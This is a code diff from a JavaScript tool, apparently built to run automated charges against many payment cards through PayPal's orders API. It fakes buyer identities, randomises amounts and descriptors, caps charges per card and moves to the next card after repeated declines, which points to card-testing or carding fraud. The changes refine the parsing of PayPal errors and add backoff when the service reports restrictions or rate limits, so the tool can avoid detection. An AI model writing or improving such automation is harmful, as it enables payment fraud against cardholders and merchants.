@@ -586,7 +586,7 @@ async function chargeCheckout(card, amount, currency, buyer, descriptor){
   const api = cfg.env==='live' ? 'https://api-m.paypal.com' : 'https://api-m.sandbox.paypal.com';
   const r1=await fetch(api+'/v2/checkout/orders',{ method:'POST', headers:{'Content-Type':'application/json','Authorization':'Bearer '+token,'PayPal-Request-Id':'ccr-'+Date.now()+'-'+Math.random().toString(36).slice(2,12)}, body:JSON.stringify({ intent:'CAPTURE', purchase_units:[{ amount:{currency_code:currency,value:amount.toFixed(2)}, description:descriptor }] }) });
   const o=await r1.json().catch(()=>({}));
-  if(!r1.ok||!o.id) return { ok:false, kind:'error', message:'ordem nao criada: '+((o.message||o.error||('HTTP '+r1.status))), raw:o };
+  if(!r1.ok||!o.id){ const d0=(Array.isArray(o.details)&&o.details[0])||{}; return { ok:false, kind:'error', message:'ordem nao criada: '+(d0.issue?d0.issue+' @'+String(d0.field||'')+' '+String(d0.description||''):'sem detalhe ('+(o.message||('HTTP '+r1.status))+')')+' dbg:'+(o.debug_id||'-'), raw:o }; }
   const oid=o.id;
   const appr=(o.links||[]).find(l=>l.rel==='approve');
   if(!appr) return { ok:false, kind:'error', message:'sem link de aprovacao na ordem', raw:o };
@@ -938,6 +938,7 @@ async function cardSession(w) {
     if (!stats.running || w.quit) break;
     if (s.charges >= cfg.maxPerCard) break;   // teto de segurança por cartão
     if (decl >= cfg.maxDeclines) break;       // secou / travou → próximo
+    if (stats.paused) { await sleep(5000); continue; }
     const amount = (cfg.fixAmount && s.firstAmount != null) ? s.firstAmount : randAmount(cfg.min, cfg.max);
     const buyer = fakeIdentity();
     const descriptor = pick(DESCRIPTORS);
@@ -961,7 +962,8 @@ async function cardSession(w) {
         const to = setTimeout(() => { if (stats.paused) { stats.paused = null; stats.errStreak = 0; emit('resume', {}); } }, 60000);
         if (to.unref) to.unref();
       }
-      await sleep(1500);
+      const ems=String(r.message||'');
+      await sleep(/restricted|maintenance|too_?many/i.test(ems)?120000:(stats.errStreak>=5?60000:1500));
     } else {
       decl++; stats.errStreak = 0;
       const m = String(r.message || '').slice(0, 120);
